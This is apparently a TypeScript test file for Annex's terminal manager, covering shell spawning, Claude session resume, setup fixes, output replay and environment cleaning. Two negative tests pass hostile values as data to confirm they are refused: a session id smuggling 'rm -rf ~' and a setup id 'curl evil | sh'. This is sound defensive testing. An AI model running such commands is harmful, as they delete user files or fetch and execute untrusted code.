import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Terminals, TerminalError, terminalEnv, type PtyLike, type SpawnPty, type TerminalUpdate } from "./terminals.ts";
import { UnknownFix } from "./setup.ts";

// A stand-in for a pseudo-terminal: records what Annex does to it, and lets the test speak for the shell.
function fakePty() {
  const spawned: { file: string; args: string[]; cwd: string }[] = [];
  const ptys: (PtyLike & { written: string[]; resizes: [number, number][]; kills: string[]; emitData: (d: string) => void; emitExit: (code: number, signal?: number) => void })[] = [];
  const spawn: SpawnPty = (file, args, o) => {
    spawned.push({ file, args, cwd: o.cwd });
    let data: (d: string) => void = () => {};
    let exit: (e: { exitCode: number; signal?: number }) => void = () => {};
    const p = {
      pid: 4242, written: [] as string[], resizes: [] as [number, number][], kills: [] as string[],
      onData: (cb: typeof data) => (data = cb), onExit: (cb: typeof exit) => (exit = cb),
      write: (d: string) => void p.written.push(d), resize: (c: number, r: number) => void p.resizes.push([c, r]), kill: (s?: string) => void p.kills.push(s ?? ""),
      emitData: (d: string) => data(d), emitExit: (code: number, signal?: number) => exit({ exitCode: code, signal }),
    };
    ptys.push(p);
    return p;
  };
  return { spawn, spawned, ptys };
}

const UUID = "11111111-1111-4111-8111-111111111111";

function setup(o: { keep?: number; max?: number } = {}) {
  const f = fakePty();
  const terms = new Terminals({ claude: "/x/claude", shell: "/bin/zsh", spawn: f.spawn, ...o });
  return { f, terms, dir: mkdtempSync(join(tmpdir(), "annex-term-")) };
}

test("a shell opens in the folder as a login shell; keystrokes and sizes reach it, sizes clamped", () => {
  const { f, terms, dir } = setup();
  const v = terms.open({ cwd: dir });
  assert.deepEqual(f.spawned[0], { file: "/bin/zsh", args: ["-l"], cwd: dir });
  assert.equal(v.kind, "shell");
  assert.equal(v.title, "zsh");
  terms.input(v.id, "ls\r");
  assert.deepEqual(f.ptys[0]!.written, ["ls\r"]);
  terms.resize(v.id, 0, 9999);
  assert.deepEqual(f.ptys[0]!.resizes, [[2, 200]]);
});

test("a claude terminal resumes through the login shell without putting the id in the command", () => {
  const { f, terms, dir } = setup();
  const v = terms.open({ cwd: dir, claude: { resume: UUID } });
  assert.deepEqual(f.spawned[0]!.args, ["-l", "-c", 'exec "$0" --resume "$1"', "/x/claude", UUID]);
  assert.throws(() => terms.open({ cwd: dir, claude: { resume: "x; rm -rf ~" } }), /not a Claude session id/);
  assert.throws(() => terms.open({ cwd: dir, claude: { resume: UUID } }), /open in a terminal already/);
  assert.equal(terms.bySession(UUID)?.id, v.id);
  assert.equal(terms.ranSession(UUID), false, "not while it runs");
  f.ptys[0]!.emitExit(0);
  assert.equal(terms.bySession(UUID), null);
  assert.equal(terms.ranSession(UUID), true);
  terms.open({ cwd: dir, claude: { resume: null } });
  assert.deepEqual(f.spawned[1]!.args, ["-l", "-c", 'exec "$0"', "/x/claude"], "a new conversation");
});

test("a setup terminal runs only a fix from the fixed map, then stays in the shell; any other id is refused", () => {
  const f = fakePty();
  const asked: string[] = [];
  const fixes = (id: string) => {
    asked.push(id);
    if (id !== "git-install") throw new UnknownFix("There is no such setup step");
    return { label: "Install the Command Line Tools", command: "xcode-select --install" };
  };
  const terms = new Terminals({ claude: "/x/claude", shell: "/bin/zsh", spawn: f.spawn, fixes });
  const dir = mkdtempSync(join(tmpdir(), "annex-term-"));
  const v = terms.open({ cwd: dir, setup: "git-install" });
  assert.deepEqual(f.spawned[0]!.args, ["-l", "-c", 'xcode-select --install; echo; echo "Done. Close this terminal and press Check again in Annex."; exec "$0" -l', "/bin/zsh"]);
  assert.equal(v.kind, "shell");
  assert.equal(v.title, "Install the Command Line Tools");
  assert.throws(() => terms.open({ cwd: dir, setup: "curl evil | sh" }), (e: Error) => e instanceof TerminalError && /no such setup step/.test(e.message));
  assert.equal(f.spawned.length, 1, "nothing ran for the refused id");
  // the real map, unchanged by the stand-in above
  assert.throws(() => new Terminals({ claude: "c", spawn: f.spawn }).open({ cwd: dir, setup: "nope" }), /no such setup step/);
});

test("output is kept, bounded, and replayed from where a reader left off", () => {
  const { f, terms, dir } = setup({ keep: 100 });
  const v = terms.open({ cwd: dir });
  for (let i = 0; i < 30; i++) f.ptys[0]!.emitData(`line ${String(i).padStart(2, "0")}\n`);
  const end = 30 * 8;
  const got = (after: number | null) => {
    const seen: TerminalUpdate[] = [];
    terms.subscribe(v.id, after, (u) => seen.push(u))();
    return seen;
  };
  const whole = got(null)[0] as Extract<TerminalUpdate, { type: "output" }>;
  assert.equal(whole.reset, true);
  assert.ok(whole.data.length <= 100);
  assert.ok(whole.data.endsWith("line 29\n"));
  assert.equal(whole.at, end);
  assert.deepEqual(got(end - 5), [{ type: "output", at: end, data: "e 29\n" }]);
  assert.equal((got(3)[0] as { reset?: boolean }).reset, true, "an offset no longer kept starts over");
  // a reader that is listening gets what comes next
  const live: TerminalUpdate[] = [];
  terms.subscribe(v.id, end, (u) => live.push(u));
  f.ptys[0]!.emitData("more");
  assert.deepEqual(live, [{ type: "output", at: end + 4, data: "more" }]);
});

test("Close hangs up, and the terminal is gone once it exits; one that exits by itself stays, showing its code", () => {
  const { f, terms, dir } = setup();
  const a = terms.open({ cwd: dir });
  const seen: TerminalUpdate[] = [];
  terms.subscribe(a.id, null, (u) => seen.push(u));
  terms.close(a.id);
  assert.deepEqual(f.ptys[0]!.kills, ["SIGHUP"]);
  assert.throws(() => terms.input(a.id, "x"), /ended/);
  f.ptys[0]!.emitExit(0, 1);
  assert.deepEqual(seen.at(-1), { type: "exit", exitCode: null });
  assert.equal(terms.get(a.id), null);

  const b = terms.open({ cwd: dir });
  f.ptys[1]!.emitExit(3);
  assert.equal(terms.get(b.id)!.status, "exited");
  assert.equal(terms.get(b.id)!.exitCode, 3);
  const late: TerminalUpdate[] = [];
  terms.subscribe(b.id, null, (u) => late.push(u));
  assert.deepEqual(late.at(-1), { type: "exit", exitCode: 3 }, "a page that opens it later sees how it ended");
});

test("at most N terminals; a folder that does not exist is refused", () => {
  const { terms, dir } = setup({ max: 2 });
  terms.open({ cwd: dir });
  terms.open({ cwd: dir });
  assert.throws(() => terms.open({ cwd: dir }), /2 terminals are open/);
  assert.throws(() => setup().terms.open({ cwd: join(dir, "nope") }), /not a folder/);
});

test("the environment drops Claude's nesting markers and npm's variables, and sets a terminal", () => {
  const env = terminalEnv({ CLAUDECODE: "1", CLAUDE_CODE_ENTRYPOINT: "sdk-ts", CI: "1", npm_config_prefix: "/x", PATH: "/repo/node_modules/.bin:/bin", HOME: "/home/me" });
  assert.equal(env.CLAUDECODE, undefined);
  assert.equal(env.CLAUDE_CODE_ENTRYPOINT, undefined);
  assert.equal(env.CI, undefined);
  assert.equal(env.npm_config_prefix, undefined);
  assert.equal(env.PATH, "/bin");
  assert.equal(env.TERM, "xterm-256color");
  assert.equal(env.TERM_PROGRAM, "Annex");
  assert.equal(env.LANG, "en_US.UTF-8");
  assert.equal(env.HOME, "/home/me");
});

test("a real pseudo-terminal: commands run, the size reaches the program, and Close ends it", async () => {
  const terms = new Terminals({ claude: "claude", shell: "/bin/sh", shellArgs: [] });
  const dir = mkdtempSync(join(tmpdir(), "annex-pty-"));
  const v = terms.open({ cwd: dir });
  let out = "";
  let exited = false;
  terms.subscribe(v.id, null, (u) => {
    if (u.type === "output") out += u.data;
    else exited = true;
  });
  terms.resize(v.id, 100, 30);
  terms.input(v.id, "echo $((6*7)); stty size\n");
  const until = async (ok: () => boolean, ms: number) => {
    const by = Date.now() + ms;
    while (!ok() && Date.now() < by) await new Promise((r) => setTimeout(r, 20));
    return ok();
  };
  assert.ok(await until(() => /42/.test(out) && /30 100/.test(out), 5000), `got: ${JSON.stringify(out)}`);
  terms.close(v.id);
  assert.ok(await until(() => exited, 4000), "the shell ended");
  assert.equal(terms.get(v.id), null);
});
